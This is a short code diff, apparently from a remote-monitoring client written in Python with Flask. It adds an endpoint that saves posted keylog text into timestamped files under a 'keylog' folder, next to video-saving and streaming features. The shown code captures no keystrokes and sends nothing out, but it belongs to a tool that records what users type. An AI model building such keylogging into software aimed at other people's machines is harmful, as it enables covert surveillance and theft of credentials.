@@ -81,6 +81,31 @@ def save_video_locally(seconds):
         return f"Saved to: {os.path.abspath(filename)}"
     except Exception as e: return f"[ERROR] {e}"
 
+    # --- THÊM VÀO client.py ---
+
+@app.route("/api/save_keylog_local", methods=["POST"])
+def save_keylog_local():
+    try:
+        data = request.json
+        content = data.get("content", "")
+        
+        # Tạo thư mục keylog nếu chưa có
+        folder = "keylog"
+        if not os.path.exists(folder):
+            os.makedirs(folder)
+            
+        # Tạo tên file theo thời gian
+        filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+        filepath = os.path.join(folder, filename)
+        
+        # Ghi file
+        with open(filepath, "w", encoding="utf-8") as f:
+            f.write(content)
+            
+        return jsonify({"status": "ok", "message": f"Saved to {filepath}"})
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)})
+
 # --- FEATURES ---
 
 # 1. STREAMING
